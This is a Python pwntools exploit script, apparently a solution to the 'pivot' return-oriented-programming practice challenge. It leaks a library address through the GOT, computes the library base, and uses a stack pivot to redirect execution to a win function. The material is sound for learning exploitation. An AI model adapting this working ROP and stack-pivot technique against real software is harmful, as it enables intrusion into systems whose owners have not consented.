#! /usr/bin/env python
from pwn import *

program = "./pivot"
proc = process(program)

elf_prog = ELF(program)
libc = ELF("./libpivot.so")
#pid = gdb.attach(proc, '''
#    set pagination off
#    set disassembly-flavor intel
#    
#    b * 0x004009a7
#    continue
#    '''
#    )

plt_puts = elf_prog.plt['puts']
plt_foothold = elf_prog.plt['foothold_function']
got_foothold = elf_prog.got['foothold_function']
main = elf_prog.symbols['main']

gadget1 = 0x04008ef # leave; ret;
gadget2 = 0x0400a33 # pop rdi; ret;
align_gadget = 0x04006b6 # ret;

#align
#rop chain store in pivot area
payload = p64(align_gadget) + p64(align_gadget) + p64(plt_foothold) + p64(gadget2) + p64(got_foothold) + p64(plt_puts) + p64(main) 

proc.recvuntil('pivot: ')

rop_add = proc.recvline()
rop_add = int(rop_add, 16)
print("rop_address: " + hex(rop_add))

proc.recvuntil('> ')
proc.sendline(payload)
print("send rop chain")

payload = b'A'*32
#do stack pivot
payload += p64(rop_add) + p64(gadget1)

proc.recvuntil('> ')
proc.sendline(payload)
print("send payload")

proc.recvuntil('libpivot\n')

libc_foothold = proc.recvline()
libc_foothold = u64(libc_foothold[:-1].ljust(8, b'\x00'))
libc_base = libc_foothold - libc.symbols['foothold_function'] 
libc_ret2win = libc_base + libc.symbols['ret2win']
print('libc_foothold: ' + str(hex(libc_foothold)))
print('libc_base: ' + str(hex(libc_base)))
print('libc_ret2win: ' + str(hex(libc_ret2win)))

proc.recvuntil('pivot: ')

rop_add = proc.recvline()
rop_add = int(rop_add, 16)
print("rop_address: " + hex(rop_add))

proc.recvuntil('> ')

payload = p64(align_gadget) + p64(libc_ret2win) 
proc.sendline(payload)
print("send rop chain")
payload = b'A'*32
#do stack pivot
payload += p64(rop_add) + p64(gadget1)

proc.recvuntil('> ')

proc.sendline(payload)
print("send payload")

proc.interactive()




